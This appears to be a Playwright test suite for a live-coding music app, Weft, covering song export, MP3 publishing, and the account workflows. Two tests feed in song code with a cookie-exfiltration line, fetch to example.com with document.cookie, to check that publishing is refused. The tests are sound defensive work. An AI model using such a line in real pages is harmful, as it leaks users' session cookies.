import { expect, test, type Page } from '@playwright/test'
import { readFileSync } from 'node:fs'

const SONG = 'setcpm(120/4)\n\nvoc: s("long_take")\n'
const RATE = 44100
const LEAD = 0.05

// Twelve seconds of a tone as a 16 bit WAV file, a little over a megabyte, with a twentieth of
// a second of silence in front so that where it starts can be told.
function longTake(): Buffer {
    const frames = RATE * 12
    const file = Buffer.alloc(44 + frames * 2)
    file.write('RIFF', 0, 'latin1')
    file.writeUInt32LE(36 + frames * 2, 4)
    file.write('WAVEfmt ', 8, 'latin1')
    file.writeUInt32LE(16, 16)
    file.writeUInt16LE(1, 20)
    file.writeUInt16LE(1, 22)
    file.writeUInt32LE(RATE, 24)
    file.writeUInt32LE(RATE * 2, 28)
    file.writeUInt16LE(2, 32)
    file.writeUInt16LE(16, 34)
    file.write('data', 36, 'latin1')
    file.writeUInt32LE(frames * 2, 40)
    for (let at = Math.round(RATE * LEAD); at < frames; at++) file.writeInt16LE(Math.round(Math.sin((at / RATE) * 2 * Math.PI * 330) * 20000), 44 + at * 2)
    return file
}

async function open(page: Page, song = SONG) {
    await page.addInitScript((text) => {
        if (!sessionStorage.getItem('seeded')) {
            localStorage.setItem('weft.song', text)
            sessionStorage.setItem('seeded', '1')
        }
    }, song)
    await page.goto('/')
    await page.waitForFunction(() => Boolean((window as any).__weft))
    await expect(page.getByTestId('sounds')).toHaveText('Sounds ready', { timeout: 30000 })
}

async function addLongTake(page: Page) {
    await page.getByRole('button', { name: 'Sounds', exact: true }).click()
    await page.getByTestId('sound-browser').getByRole('radio', { name: /^Yours/ }).click()
    await page.getByTestId('own-files').setInputFiles([{ name: 'long take.wav', mimeType: 'audio/wav', buffer: longTake() }])
    await expect(page.getByTestId('sound-browser').locator('.sb-i code')).toHaveText('long_take')
}

const prepare = (page: Page) => page.evaluate(() => (window as any).__weft.prepareToPublish())

// Where the sound the app keeps under this name starts, in seconds, and what kind of file it is.
const kept = (page: Page, name: string) =>
    page.evaluate(async (wanted) => {
        const database = await new Promise<IDBDatabase>((resolve, reject) => {
            const request = indexedDB.open('weft', 1)
            request.onsuccess = () => resolve(request.result)
            request.onerror = () => reject(request.error)
        })
        const sound = await new Promise<{ type: string; data: ArrayBuffer }>((resolve, reject) => {
            const request = database.transaction('sounds').objectStore('sounds').get(wanted)
            request.onsuccess = () => resolve(request.result)
            request.onerror = () => reject(request.error)
        })
        const heard = await (window as any).__weft.engine.decodeAudio(sound.data.slice(0))
        const samples: Float32Array = heard.channels[0]
        let peak = 0
        for (const sample of samples) peak = Math.max(peak, Math.abs(sample))
        const first = samples.findIndex((sample) => Math.abs(sample) >= peak * 0.1)
        return { type: sound.type, onset: first / heard.sampleRate }
    }, name)

test('a song file that is exported holds its sounds as they are, however large', async ({ page }) => {
    await open(page)
    await addLongTake(page)
    await page.getByTestId('song-name').click()
    await page.getByTestId('song-menu').getByRole('button', { name: 'Export', exact: true }).click()
    const dialog = page.getByTestId('export')
    await expect(dialog.getByRole('button', { name: /small/i })).toHaveCount(0)
    const [download] = await Promise.all([page.waitForEvent('download'), dialog.getByRole('button', { name: 'Song file (.weft)', exact: true }).click()])
    const text = readFileSync((await download.path())!, 'utf8')
    expect(text.length).toBeGreaterThan(1024 * 1024)
    const packed = JSON.parse(text).sounds[0]
    expect(packed).toMatchObject({ name: 'long_take', file: 'long take.wav', type: 'audio/wav' })
    expect(packed.onset).toBeUndefined()
    expect(Buffer.from(packed.data, 'base64').equals(longTake())).toBe(true)
})

test('for publishing the sounds are made into MP3 so the file fits, and they start where they did when it is opened', async ({ page, browser }) => {
    await open(page)
    await addLongTake(page)
    const made = await prepare(page)
    expect(made).toMatchObject({ ok: true, kbps: 128 })
    expect(made.text.length).toBeLessThan(400 * 1024)
    const packed = JSON.parse(made.text).sounds[0]
    expect(packed).toMatchObject({ name: 'long_take', file: 'long take.mp3', type: 'audio/mpeg' })
    expect(Math.abs(packed.onset - LEAD)).toBeLessThan(0.003)

    const other = await (await browser.newContext()).newPage()
    await other.goto('/')
    await other.waitForFunction(() => Boolean((window as any).__weft))
    await expect(other.getByTestId('sounds')).toHaveText('Sounds ready', { timeout: 30000 })
    await other.getByTestId('song-name').click()
    await other.getByTestId('song-file').setInputFiles({ name: 'Untitled.weft', mimeType: 'application/json', buffer: Buffer.from(made.text) })
    await expect(other.getByTestId('song-note')).toContainText('with 1 sound of its own')
    const after = await kept(other, 'long_take')
    expect(after.type).toBe('audio/wav')
    expect(Math.abs(after.onset - LEAD)).toBeLessThan(0.003)
    await other.context().close()
})

test('a song with code that is more than music is not made ready for publishing', async ({ page }) => {
    await open(page, 'setcpm(120/4)\n\ndrums: s("bd*4")\nfetch("https://example.com/" + document.cookie)\n')
    expect(await prepare(page)).toEqual({ ok: false, refused: { why: 'code', what: 'fetch is not something a song can use', line: 4 } })
})

const SYNTHS = 'setcpm(120/4)\n\nbass: note("c2 c3 c2 e2").s("sawtooth").lpf(600)\n\nlead: note("c4 e4 g4 e4").s("triangle")\n'
const dialog = (page: Page) => page.getByTestId('publish')
const account = (page: Page) => page.getByTestId('account')
const someone = () => `ante+${Date.now().toString(36)}${Math.random().toString(36).slice(2, 6)}@example.com`

async function openPublish(page: Page) {
    await page.getByTestId('song-name').click()
    await page.getByTestId('song-menu').getByRole('button', { name: 'Publish', exact: true }).click()
    await expect(dialog(page)).toBeVisible()
}

const PASSWORD = 'a test password 42'

// A new person each time: an account is made in the publish window, which signs it in.
async function signIn(page: Page, email = someone()): Promise<string> {
    await expect(dialog(page).getByRole('button', { name: 'Make an account', exact: true })).toHaveAttribute('aria-pressed', 'true')
    await dialog(page).getByLabel('Your name', { exact: true }).fill('Ante')
    await dialog(page).getByLabel('Your email', { exact: true }).fill(email)
    await dialog(page).getByLabel('Your password', { exact: true }).fill(PASSWORD)
    await dialog(page).getByRole('button', { name: 'Make my account', exact: true }).click()
    await expect(page.getByTestId('publish-count')).toHaveText('You have used 0 of your 10 songs.')
    return email
}

test('a song is published from the app: make an account, say what the song is, and it is on the site', async ({ page }) => {
    await open(page, SYNTHS)
    await openPublish(page)
    await expect(dialog(page)).toContainText('It needs an account: your email and a password.')
    const email = await signIn(page)
    await expect(page.getByTestId('publish-note')).toContainText('The song file is')

    await dialog(page).getByPlaceholder("What people read on the song's page").fill('Two synths going round.')
    await dialog(page).getByPlaceholder('One tag, in your own words').fill('test tone')
    await dialog(page).getByRole('radio', { name: /CC0/ }).click()
    await dialog(page).getByRole('button', { name: 'Publish', exact: true }).click()
    await expect(dialog(page)).toContainText('Untitled is published.', { timeout: 40000 })
    const address = (await dialog(page).locator('.pb-url').textContent())!.trim()
    expect(address).toMatch(/^http:\/\/127\.0\.0\.1:5191\/songs\/[a-z0-9]+$/)

    const file = await page.request.get(`${address}.weft`)
    expect(JSON.parse(await file.text())).toMatchObject({ weft: 1, name: 'Untitled', code: SYNTHS, sounds: [] })
    const preview = await page.request.get(`${address}.mp3`)
    expect(preview.headers()['content-type']).toBe('audio/mpeg')
    const bytes = (await preview.body()).length
    expect(bytes).toBeGreaterThan(200 * 1024)
    expect(bytes).toBeLessThan(700 * 1024)
    const songPage = await page.context().newPage()
    await songPage.goto(address)
    await expect(songPage.getByRole('heading', { name: 'Untitled', level: 1 })).toBeVisible()
    for (const said of ['Ante', 'Two synths going round.', 'test tone', '120 bpm', 'bass', 'lead', 'CC0', 'Download .weft', 'Open in Weft']) await expect(songPage.locator('body')).toContainText(said)
    await songPage.close()

    await dialog(page).getByRole('button', { name: 'Close', exact: true }).click()
    await openPublish(page)
    await expect(page.getByTestId('publish-count')).toHaveText('You have used 1 of your 10 songs.')
    await dialog(page).getByRole('button', { name: 'Your account and your songs', exact: true }).click()
    const mine = page.getByTestId('account-songs')
    await expect(mine).toContainText('Untitled')
    await expect(page.getByTestId('account-count')).toContainText('You have used 1 of your 10 songs. 1 is published and 0 hidden.')
    await mine.getByRole('button', { name: 'Delete', exact: true }).click()
    await mine.getByRole('button', { name: 'Yes, delete Untitled', exact: true }).click()
    await expect(page.getByTestId('account-count')).toHaveText('You have used 0 of your 10 songs.')
    expect((await page.request.get(address)).status()).toBe(404)

    await account(page).getByRole('tab', { name: 'Account', exact: true }).click()
    await account(page).getByRole('button', { name: 'Sign out', exact: true }).click()
    await expect(account(page).getByRole('button', { name: 'Sign in', exact: true }).first()).toHaveAttribute('aria-pressed', 'true')
    await expect(account(page).getByLabel('Your email', { exact: true })).toHaveValue(email)
    await account(page).getByLabel('Your password', { exact: true }).fill('not the password')
    await account(page).getByLabel('Your password', { exact: true }).press('Enter')
    await expect(page.getByTestId('account-note')).toHaveText('The email or the password is not right.')
    await account(page).getByLabel('Your password', { exact: true }).fill(PASSWORD)
    await account(page).getByLabel('Your password', { exact: true }).press('Enter')
    await expect(page.getByTestId('account-count')).toHaveText('You have used 0 of your 10 songs.')
})

test('the app stays signed in after a restart', async ({ page }) => {
    await open(page, SYNTHS)
    await openPublish(page)
    await signIn(page)
    await page.reload()
    await page.waitForFunction(() => Boolean((window as any).__weft))
    await openPublish(page)
    await expect(page.getByTestId('publish-count')).toHaveText('You have used 0 of your 10 songs.')
})

test('a song with code that is more than music cannot be published from the app', async ({ page }) => {
    await open(page, `${SYNTHS}fetch("https://example.com/" + document.cookie)\n`)
    await openPublish(page)
    await signIn(page)
    const refused = page.getByTestId('publish-refused')
    await expect(refused).toContainText('This song cannot be published')
    await expect(refused).toContainText('Line 6: fetch is not something a song can use. A song may hold only music code')
    await expect(dialog(page).getByRole('button', { name: 'Publish', exact: true })).toBeDisabled()
})

test('the half minute people hear starts where most of the song plays for all of it, and can be moved', async ({ page }) => {
    await open(page, 'setcpm(120/4)\n\nbass: note("c2").s("sawtooth").mask("<0!4 1!28>")\n\nlead: note("c4").s("triangle").mask("<0!8 1!16 0!8>")\n\nhigh: note("c5").s("sine").mask("<0!30 1!2>")\n')
    await openPublish(page)
    await signIn(page)
    await expect(page.getByTestId('publish-from')).toHaveText('9')
    await dialog(page).getByRole('button', { name: 'An earlier bar', exact: true }).click()
    await expect(page.getByTestId('publish-from')).toHaveText('8')
})

test('an account needs a name, an address and a password of some length, and an address can have one account', async ({ page }) => {
    await open(page, SYNTHS)
    await openPublish(page)
    const email = someone()
    const note = page.getByTestId('account-note')
    const make = dialog(page).getByRole('button', { name: 'Make my account', exact: true })
    await dialog(page).getByLabel('Your email', { exact: true }).fill(email)
    await dialog(page).getByLabel('Your password', { exact: true }).fill(PASSWORD)
    await make.click()
    await expect(note).toHaveText('Type the name that should stand beside your songs.')
    await dialog(page).getByLabel('Your name', { exact: true }).fill('Ante')
    await dialog(page).getByLabel('Your password', { exact: true }).fill('short')
    await make.click()
    await expect(note).toHaveText('A password needs at least 8 characters.')
    await dialog(page).getByLabel('Your password', { exact: true }).fill(PASSWORD)
    await make.click()
    await expect(page.getByTestId('publish-count')).toHaveText('You have used 0 of your 10 songs.')
    await dialog(page).getByRole('button', { name: 'Close', exact: true }).click()

    await openAccount(page)
    await account(page).getByRole('tab', { name: 'Account', exact: true }).click()
    await account(page).getByRole('button', { name: 'Sign out', exact: true }).click()
    await account(page).getByRole('button', { name: 'Make an account', exact: true }).click()
    await account(page).getByLabel('Your name', { exact: true }).fill('Someone else')
    await account(page).getByLabel('Your password', { exact: true }).fill('another password')
    await account(page).getByRole('button', { name: 'Make my account', exact: true }).click()
    await expect(note).toHaveText('There is already an account with this email. Sign in instead.')
})

async function openAccount(page: Page) {
    await page.getByTestId('song-name').click()
    await page.getByTestId('song-menu').getByRole('button', { name: 'Your account', exact: true }).click()
    await expect(account(page)).toBeVisible()
}

// An account with one published song, with the account window open on its songs.
async function withASong(page: Page): Promise<{ email: string; address: string }> {
    await open(page, SYNTHS)
    await openPublish(page)
    const email = await signIn(page)
    await dialog(page).getByRole('button', { name: 'Publish', exact: true }).click()
    await expect(dialog(page)).toContainText('Untitled is published.', { timeout: 40000 })
    const address = (await dialog(page).locator('.pb-url').textContent())!.trim()
    await dialog(page).getByRole('button', { name: 'Close', exact: true }).click()
    await openAccount(page)
    await expect(page.getByTestId('account-songs')).toContainText('Untitled')
    return { email, address }
}

test('your songs are kept from the app: what a song says, whether it is shown, and that it is there at all', async ({ page }) => {
    const { address } = await withASong(page)
    const mine = page.getByTestId('account-songs')
    await mine.getByRole('button', { name: 'Edit', exact: true }).click()
    await mine.getByLabel('Description of Untitled').fill('Changed in the app.')
    await mine.getByLabel('Style of Untitled').fill('drone')
    await mine.getByRole('radio', { name: 'CC0', exact: true }).click()
    await mine.getByRole('button', { name: 'Save', exact: true }).click()
    await expect(page.getByTestId('account-note')).toHaveText('The song is changed.')
    const shown = await page.context().newPage()
    await shown.goto(address)
    await expect(shown.locator('body')).toContainText('Changed in the app.')
    await expect(shown.locator('body')).toContainText('drone')
    await expect(shown.locator('body')).toContainText('CC0')

    await mine.getByRole('button', { name: 'Hide', exact: true }).click()
    await expect(page.getByTestId('account-count')).toContainText('0 are published and 1 hidden. A hidden song counts.')
    expect((await page.request.get(address)).status()).toBe(404)
    await mine.getByRole('button', { name: 'Show', exact: true }).click()
    await expect(page.getByTestId('account-count')).toContainText('1 is published and 0 hidden.')
    expect((await page.request.get(address)).status()).toBe(200)
    await shown.close()
})

test('your name and your password are changed in the app', async ({ page }) => {
    const { email, address } = await withASong(page)
    const note = page.getByTestId('account-note')
    await account(page).getByRole('tab', { name: 'Profile', exact: true }).click()
    await account(page).getByLabel('Your name', { exact: true }).fill('Ante L')
    await account(page).getByRole('button', { name: 'Save', exact: true }).click()
    await expect(note).toHaveText('Your name is changed.')
    const shown = await page.context().newPage()
    await shown.goto(address)
    await expect(shown.locator('body')).toContainText('Ante L')
    await shown.close()

    await expect(account(page).getByRole('tab', { name: 'Jams', exact: true })).toHaveCount(0)

    await account(page).getByRole('tab', { name: 'Account', exact: true }).click()
    await account(page).getByLabel('Your password now').fill('not it')
    await account(page).getByLabel('Your new password').fill('a new password 43')
    await account(page).getByRole('button', { name: 'Change it', exact: true }).click()
    await expect(note).toHaveText('The password you have now is not right.')
    await account(page).getByLabel('Your password now').fill(PASSWORD)
    await account(page).getByRole('button', { name: 'Change it', exact: true }).click()
    await expect(note).toHaveText('Your password is changed.')
    await account(page).getByRole('button', { name: 'Sign out', exact: true }).click()
    await account(page).getByLabel('Your password', { exact: true }).fill(PASSWORD)
    await account(page).getByLabel('Your password', { exact: true }).press('Enter')
    await expect(note).toHaveText('The email or the password is not right.')
    await account(page).getByLabel('Your password', { exact: true }).fill('a new password 43')
    await account(page).getByLabel('Your password', { exact: true }).press('Enter')
    await expect(page.getByTestId('account-count')).toContainText('You have used 1 of your 10 songs.')
    expect(email).toContain('@')
})

test('a forgotten password is replaced with a code typed into the app', async ({ page }) => {
    const { email } = await withASong(page)
    const note = page.getByTestId('account-note')
    await account(page).getByRole('tab', { name: 'Account', exact: true }).click()
    await account(page).getByRole('button', { name: 'Sign out', exact: true }).click()
    await account(page).getByRole('button', { name: 'Forgot your password?', exact: true }).click()
    await expect(note).toContainText('a code is on its way')
    const code = (await page.getByTestId('account-code').locator('b').textContent())!.trim()
    await account(page).getByLabel('The code that was sent to you').fill('WRONG123')
    await account(page).getByLabel('Your new password').fill('the third password')
    await account(page).getByRole('button', { name: 'Set the new password', exact: true }).click()
    await expect(note).toHaveText('That code is not right, or it has run out. Ask for a new one.')
    await account(page).getByLabel('The code that was sent to you').fill(code.toLowerCase())
    await account(page).getByRole('button', { name: 'Set the new password', exact: true }).click()
    await expect(page.getByTestId('account-count')).toContainText('You have used 1 of your 10 songs.')

    await account(page).getByRole('tab', { name: 'Account', exact: true }).click()
    await account(page).getByRole('button', { name: 'Sign out', exact: true }).click()
    await expect(account(page).getByLabel('Your email', { exact: true })).toHaveValue(email)
    await account(page).getByLabel('Your password', { exact: true }).fill(PASSWORD)
    await account(page).getByLabel('Your password', { exact: true }).press('Enter')
    await expect(note).toHaveText('The email or the password is not right.')
})

test('an account is deleted from the app, with its songs', async ({ page }) => {
    const { address } = await withASong(page)
    await account(page).getByRole('tab', { name: 'Account', exact: true }).click()
    await account(page).getByLabel('Your password, to delete the account').fill(PASSWORD)
    await account(page).getByRole('button', { name: 'Delete my account', exact: true }).click()
    await account(page).getByRole('button', { name: 'Yes, delete my account and its songs', exact: true }).click()
    await expect(page.getByTestId('account-note')).toHaveText('Your account and its songs are deleted.')
    await expect(account(page).getByLabel('Your email', { exact: true })).toBeVisible()
    expect((await page.request.get(address)).status()).toBe(404)
})
